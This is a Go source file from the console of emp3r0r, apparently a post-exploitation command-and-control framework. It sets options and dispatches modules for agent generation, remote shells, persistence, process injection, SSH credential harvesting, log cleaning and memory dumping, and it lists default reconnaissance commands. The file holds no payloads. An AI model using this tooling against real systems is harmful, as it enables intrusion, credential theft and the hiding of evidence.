//go:build linux
// +build linux

package cc

import (
	"fmt"
	"os"
	"strconv"
	"strings"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/lithammer/fuzzysearch/fuzzy"
)

// Option all necessary info of an option
type Option struct {
	Name string   // like `module`, `target`, `cmd_to_exec`
	Val  string   // the value to use
	Vals []string // possible values
}

var (
	// ModuleDir stores modules
	ModuleDirs []string

	// CurrentMod selected module
	CurrentMod = "<blank>"

	// CurrentTarget selected target
	CurrentTarget *emp3r0r_def.Emp3r0rAgent

	// Options currently available options for `set`
	Options = make(map[string]*Option)

	// ShellHelpInfo provide utilities like ps, kill, etc
	// deprecated
	ShellHelpInfo = map[string]string{
		HELP:    "Display this help",
		"#ps":   "List processes: `ps`",
		"#kill": "Kill process: `kill <PID>`",
		"#net":  "Show network info",
		"put":   "Put a file from CC to agent: `put <local file> <remote path>`",
		"get":   "Get a file from agent: `get <remote file>`",
	}

	// ModuleHelpers a map of module helpers
	ModuleHelpers = map[string]func(){
		emp3r0r_def.ModGenAgent:     modGenAgent,
		emp3r0r_def.ModCMD_EXEC:     moduleCmd,
		emp3r0r_def.ModSHELL:        moduleShell,
		emp3r0r_def.ModPROXY:        moduleProxy,
		emp3r0r_def.ModPORT_FWD:     modulePortFwd,
		emp3r0r_def.ModLPE_SUGGEST:  moduleLPE,
		emp3r0r_def.ModCLEAN_LOG:    moduleLogCleaner,
		emp3r0r_def.ModPERSISTENCE:  modulePersistence,
		emp3r0r_def.ModVACCINE:      moduleVaccine,
		emp3r0r_def.ModINJECTOR:     moduleInjector,
		emp3r0r_def.ModBring2CC:     moduleBring2CC,
		emp3r0r_def.ModStager:       modStager,
		emp3r0r_def.ModListener:     modListener,
		emp3r0r_def.ModSSHHarvester: module_ssh_harvester,
		emp3r0r_def.ModDownloader:   moduleDownloader,
		emp3r0r_def.ModFileServer:   moduleFileServer,
		emp3r0r_def.ModMemDump:      moduleMemDump,
	}
)

// SetOption set an option to value, `set` command
func SetOption(args []string) {
	opt := args[0]
	if _, exist := Options[opt]; !exist {
		CliPrintError("No such option: %s", strconv.Quote(opt))
		return
	}
	if len(args) < 2 {
		// clear value
		Options[opt].Val = ""
		return
	}

	val := args[1:] // in case val contains spaces

	// set
	Options[opt].Val = strings.Join(val, " ")
}

// UpdateOptions add new options according to current module
func UpdateOptions(modName string) (exist bool) {
	// filter user supplied option
	for mod := range ModuleHelpers {
		if mod == modName {
			exist = true
			break
		}
	}
	if !exist {
		CliPrintError("UpdateOptions: no such module: %s", modName)
		return
	}

	// help us add new Option to Options, if exists, return the *Option
	addIfNotFound := func(key string) *Option {
		if _, exist := Options[key]; !exist {
			Options[key] = &Option{Name: key, Val: "<blank>", Vals: []string{}}
		}
		return Options[key]
	}

	var currentOpt *Option
	switch modName {
	case emp3r0r_def.ModCMD_EXEC:
		currentOpt = addIfNotFound("cmd_to_exec")
		currentOpt.Vals = []string{
			"id", "whoami", "ifconfig",
			"ip a", "arp -a",
			"ps -ef", "lsmod", "ss -antup",
			"netstat -antup", "uname -a",
		}

	case emp3r0r_def.ModSHELL:
		shellOpt := addIfNotFound("shell")
		shellOpt.Vals = []string{
			"/bin/bash", "/bin/zsh", "/bin/sh", "python", "python3",
			"cmd.exe", "powershell.exe", "elvish",
		}
		shellOpt.Val = "bash"

		argsOpt := addIfNotFound("args")
		argsOpt.Val = ""
		portOpt := addIfNotFound("port")
		portOpt.Vals = []string{
			RuntimeConfig.SSHDShellPort, "22222",
		}
		portOpt.Val = RuntimeConfig.SSHDShellPort

	case emp3r0r_def.ModPORT_FWD:
		// rport
		portOpt := addIfNotFound("to")
		portOpt.Vals = []string{"127.0.0.1:22", "127.0.0.1:8080"}
		// listen on port
		lportOpt := addIfNotFound("listen_port")
		lportOpt.Vals = []string{"8080", "1080", "22", "23", "21"}
		// on/off
		switchOpt := addIfNotFound("switch")
		switchOpt.Vals = []string{"on", "off", "reverse"}
		switchOpt.Val = "on"
		// protocol
		protOpt := addIfNotFound("protocol")
		protOpt.Vals = []string{"tcp", "udp"}
		protOpt.Val = "tcp"

	case emp3r0r_def.ModCLEAN_LOG:
		// keyword to clean
		keywordOpt := addIfNotFound("keyword")
		keywordOpt.Vals = []string{"root", "admin"}

	case emp3r0r_def.ModPROXY:
		portOpt := addIfNotFound("port")
		portOpt.Vals = []string{"1080", "8080", "10800", "10888"}
		portOpt.Val = "8080"
		statusOpt := addIfNotFound("status")
		statusOpt.Vals = []string{"on", "off", "reverse"}
		statusOpt.Val = "on"

	case emp3r0r_def.ModLPE_SUGGEST:
		currentOpt = addIfNotFound("lpe_helper")
		for name := range LPEHelperURLs {
			currentOpt.Vals = append(currentOpt.Vals, name)
		}
		currentOpt.Val = "lpe_les"

	case emp3r0r_def.ModINJECTOR:
		pidOpt := addIfNotFound("pid")
		pidOpt.Vals = []string{"0"}
		pidOpt.Val = "0"
		methodOpt := addIfNotFound("method")
		for k := range emp3r0r_def.InjectorMethods {
			methodOpt.Vals = append(methodOpt.Vals, k)
		}
		methodOpt.Val = "shared_library"

	case emp3r0r_def.ModBring2CC:
		addrOpt := addIfNotFound("addr")
		kcpOpt := addIfNotFound("kcp")
		addrOpt.Vals = []string{"127.0.0.1"}
		addrOpt.Val = "<blank>"
		kcpOpt.Vals = []string{"on", "off"}
		kcpOpt.Val = "on"

	case emp3r0r_def.ModPERSISTENCE:
		currentOpt = addIfNotFound("method")
		for k := range emp3r0r_def.PersistMethods {
			currentOpt.Vals = append(currentOpt.Vals, k)
		}
		currentOpt.Val = "profiles"

	case emp3r0r_def.ModStager:
		stager_type_opt := addIfNotFound("type")
		stager_type_opt.Val = Stagers[0]
		stager_type_opt.Vals = Stagers

		agentpath_type_opt := addIfNotFound("agent_path")
		agentpath_type_opt.Val = "/tmp/emp3r0r"
		files, err := os.ReadDir(EmpWorkSpace)
		if err != nil {
			CliPrintWarning("Listing emp3r0r work directory: %v", err)
		}
		var listing []string
		for _, f := range files {
			if f.IsDir() {
				continue
			}
			listing = append(listing, f.Name())
		}
		agentpath_type_opt.Vals = listing

	case emp3r0r_def.ModGenAgent:
		// os
		os := addIfNotFound("os")
		os.Vals = []string{"linux", "windows", "dll"}
		os.Val = "linux"
		// arch
		arch := addIfNotFound("arch")
		arch.Vals = Arch_List
		arch.Val = "amd64"
		// cc host
		existing_names := tun.NamesInCert(ServerCrtFile)
		cc_host := addIfNotFound("cc_host")
		cc_host.Vals = existing_names
		cc_host.Val = read_cached_config("cc_host").(string)
		// cc indicator
		cc_indicator := addIfNotFound("cc_indicator")
		cc_indicator.Val = read_cached_config("cc_indicator").(string)
		// cc indicator value
		cc_indicator_text := addIfNotFound("indicator_text")
		cc_indicator_text.Val = read_cached_config("indicator_text").(string)
		// NCSI switch
		ncsi := addIfNotFound("ncsi")
		ncsi.Vals = []string{"on", "off"}
		ncsi.Val = "off"
		// CDN proxy
		cdn_proxy := addIfNotFound("cdn_proxy")
		cdn_proxy.Val = read_cached_config("cdn_proxy").(string)
		// shadowsocks switch
		shadowsocks := addIfNotFound("shadowsocks")
		shadowsocks.Vals = []string{"on", "off", "bare"}
		shadowsocks.Val = "off"
		// agent proxy for c2 transport
		c2transport_proxy := addIfNotFound("c2transport_proxy")
		c2transport_proxy.Val = RuntimeConfig.C2TransportProxy
		// agent proxy timeout
		autoproxy_timeout := addIfNotFound("autoproxy_timeout")
		timeout := read_cached_config("autoproxy_timeout").(float64)
		autoproxy_timeout.Val = strconv.FormatFloat(timeout, 'f', -1, 64)
		// DoH
		doh := addIfNotFound("doh_server")
		doh.Vals = []string{"https://1.1.1.1/dns-query", "https://dns.google/dns-query"}
		doh.Val = read_cached_config("doh_server").(string)
		// auto proxy, with UDP broadcasting
		auto_proxy := addIfNotFound("auto_proxy")
		auto_proxy.Vals = []string{"on", "off"}
		auto_proxy.Val = "off"

	case emp3r0r_def.ModListener:
		listenerOpt := addIfNotFound("listener")
		listenerOpt.Vals = []string{"http_aes_compressed", "http_bare"}
		listenerOpt.Val = "http_aes_compressed"
		portOpt := addIfNotFound("port")
		portOpt.Val = "8080"
		payloadOpt := addIfNotFound("payload")
		payloadOpt.Val = "emp3r0r"
		compressionOpt := addIfNotFound("compression")
		compressionOpt.Vals = []string{"on", "off"}
		compressionOpt.Val = "on"
		passphraseOpt := addIfNotFound("passphrase")
		passphraseOpt.Val = "my_secret_key"

	case emp3r0r_def.ModFileServer:
		portOpt := addIfNotFound("port")
		portOpt.Val = "8000"
		switchOpt := addIfNotFound("switch")
		switchOpt.Val = "on"

	case emp3r0r_def.ModVACCINE:
		// download_addr
		download_addr := addIfNotFound("download_addr")
		download_addr.Val = ""

	case emp3r0r_def.ModDownloader:
		// download_addr
		download_addr := addIfNotFound("download_addr")
		download_addr.Val = ""
		file_path := addIfNotFound("path")
		file_path.Val = ""
		checksum := addIfNotFound("checksum")
		checksum.Val = ""

	case emp3r0r_def.ModMemDump:
		// dump all memory regions
		pid := addIfNotFound("pid")
		pid.Val = ""

	default:
		// custom modules
		modconfig := ModuleConfigs[modName]
		for opt, val_help := range modconfig.Options {
			argOpt := addIfNotFound(opt)

			argOpt.Val = val_help[0]
		}
		download_addr := addIfNotFound("download_addr")
		download_addr.Val = ""
	}

	return
}

// ModuleRun run current module
func ModuleRun() {
	modObj := emp3r0r_def.Modules[CurrentMod]
	if modObj == nil {
		CliPrintError("ModuleRun: module %s not found", strconv.Quote(CurrentMod))
		return
	}
	if CurrentTarget != nil {
		target_os := CurrentTarget.GOOS
		mod_os := strings.ToLower(modObj.Platform)
		if mod_os != "generic" && target_os != mod_os {
			CliPrintError("ModuleRun: module %s does not support %s", strconv.Quote(CurrentMod), target_os)
			return
		}
	}

	if CurrentMod == emp3r0r_def.ModCMD_EXEC {
		if !CliYesNo("Run on all targets") {
			CliPrintError("Target not specified")
			return
		}
		go ModuleHelpers[emp3r0r_def.ModCMD_EXEC]()
		return
	}
	if CurrentMod == emp3r0r_def.ModGenAgent {
		go ModuleHelpers[emp3r0r_def.ModGenAgent]()
		return
	}
	if CurrentMod == emp3r0r_def.ModStager {
		go ModuleHelpers[emp3r0r_def.ModStager]()
		return
	}
	if CurrentTarget == nil {
		CliPrintError("Target not specified")
		return
	}
	if Targets[CurrentTarget] == nil {
		CliPrintError("Target (%s) does not exist", CurrentTarget.Tag)
		return
	}

	mod := ModuleHelpers[CurrentMod]
	if mod != nil {
		go mod()
	} else {
		CliPrintError("Module %s not found", strconv.Quote(CurrentMod))
	}
}

// SelectCurrentTarget check if current target is set and alive
func SelectCurrentTarget() (target *emp3r0r_def.Emp3r0rAgent) {
	// find target
	target = CurrentTarget
	if target == nil {
		CliPrintError("SelectCurrentTarget: Target does not exist")
		return nil
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("SelectCurrentTarget: agent control interface not found")
		return nil
	}
	if tControl.Conn == nil {
		CliPrintError("SelectCurrentTarget: agent is not connected")
		return nil
	}

	return
}

// search modules, powered by fuzzysearch
func ModuleSearch(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("search <module keywords>")
		return
	}
	query := strings.Join(cmdSplit[1:], " ")
	search_targets := new([]string)
	for name, comment := range ModuleNames {
		*search_targets = append(*search_targets, fmt.Sprintf("%s: %s", name, comment))
	}
	result := fuzzy.Find(query, *search_targets)

	// render results
	search_results := make(map[string]string)
	for _, r := range result {
		r_split := strings.Split(r, ": ")
		if len(r_split) == 2 {
			search_results[r_split[0]] = r_split[1]
		}
	}
	CliPrettyPrint("Module", "Comment", &search_results)
}
